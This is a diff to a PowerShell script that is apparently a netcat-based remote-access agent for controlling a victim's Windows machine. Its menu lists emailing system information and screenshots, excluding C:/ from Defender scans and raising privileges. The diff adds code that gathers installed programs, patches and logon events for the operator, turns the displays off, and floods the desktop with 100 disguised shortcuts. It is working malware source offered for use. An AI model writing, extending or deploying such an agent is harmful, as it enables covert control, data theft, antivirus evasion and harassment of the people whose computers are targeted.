@@ -1,4 +1,3 @@
-﻿
 <#
 ===================================== Mon's Simple Netcat Agent With Added Functions ==================================================
 
@@ -29,10 +28,67 @@ Write-Output "Win93  : Start windows93"
 Write-Output "Sendinfo  : Email Sysinfo And Screenshot"
 Write-Output "Exclude  : Exclude C:/ from future defender scans"
 Write-Output "Elevate  : Elevate Privaleges (User will see a prompt)"
+Write-Output "ProgramList : List of installed programs and EventLogs"
+Write-Output "KillDisplay  : Kill Displays for a few seconds (Experimental)"
+Write-Output "ShortcutBomb  : 100 Shortcuts on the desktop"
 Write-Output "================================================"
 Write-Output "Options     - Show this Menu"
 Write-Output "Quit         - Close this connection"
 Write-Output "================================================"
+}
+
+Function ProgramList {
+
+$date = Get-Date -Format "yyyy-MM-dd-hh-mm-ss"
+$outputPath = "$env:temp\Osint.txt"
+
+New-Item -ItemType File -Path $outputPath
+
+$installed = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, Vendor
+$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID, Description, InstalledOn
+$removed = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}
+
+$installed | Format-Table -AutoSize | Out-File -FilePath $outputPath 
+$hotfixes | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
+$removed | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
+
+$userActivity = Get-EventLog -LogName Security -EntryType SuccessAudit | Where-Object {$_.EventID -eq 4624 -or $_.EventID -eq 4634}
+$userActivity | Out-File -FilePath $outputPath -Append
+$hardwareInfo = Get-EventLog -LogName System | Where-Object {$_.EventID -eq 12 -or $_.EventID -eq 13}
+$hardwareInfo | Out-File -FilePath $outputPath -Append
+
+$textfile = Get-Content "$env:temp\Osint.txt" -Raw
+Write-Output "$textfile"
+
+}
+
+Function KillDisplay {
+
+(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
+
+}
+
+Function ShortcutBomb {
+
+$n = 100
+$i = 0
+
+while($i -lt $n) 
+{
+$num = Get-Random
+$Location = "C:\Windows\System32\rundll32.exe"
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
+$Shortcut.TargetPath = $Location
+$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
+$Shortcut.IconLocation = "hotplug.dll,0"
+$Shortcut.Description ="Device Removal"
+$Shortcut.WorkingDirectory ="C:\Windows\System32"
+$Shortcut.Save()
+Start-Sleep -Milliseconds 10
+$i++
+}
+
 }
 
 Function NetworkScan {
